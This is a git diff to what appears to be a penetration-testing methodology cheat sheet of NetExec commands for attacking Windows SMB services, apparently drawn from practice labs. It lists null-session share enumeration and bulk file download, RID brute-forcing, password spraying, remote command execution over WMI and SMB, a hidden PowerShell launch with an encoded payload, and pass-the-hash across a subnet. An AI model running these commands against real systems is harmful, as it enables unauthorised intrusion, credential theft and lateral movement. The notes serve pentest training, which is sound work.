@@ -1,5 +1,7 @@
 # Methodology
 
+## Enumeration
+
 ```bash
 # Null authentication
 nxc smb $IP -u '' -p ''
@@ -13,11 +15,27 @@ nxc smb $IP -u 'a' -p '' --shares
 # Spider all shares, downloading all readable files
 nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
 # List all files with their respective shares
-cat 10.129.34.120.json | jq '. | map_values(keys)'
+cat $IP.json | jq '. | map_values(keys)'
 
 # Brute force usernames through RIDs
 nxc smb $IP -u 'a' -p '' --rid-brute 10000
 
 # Brute force discovered users
-nxc smb 10.129.207.146 -u users.txt -p users.txt --continue-on-success
+nxc smb $IP -u users.txt -p users.txt --continue-on-success
+```
+
+## Obtained Credentials
+
+```bash
+# Check credentials (default to smb)
+nxc smb $IP -u username -p 'Password123!'
+
+# Execute commands (default to wmi, then smb)
+nxc wmi $IP -u username -p 'Password123!' -x whoami
+nxc smb $IP -u username -p 'Password123!' -x whoami
+nxc smb $IP -u username -p 'Password123!' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'
+
+# Pass a NetNTLMv2 hash
+nxc smb 192.168.1.0/24 -u username -H 'NTHASH'
+nxc smb 192.168.1.0/24 -u username -H 'LM:NT'
 ```
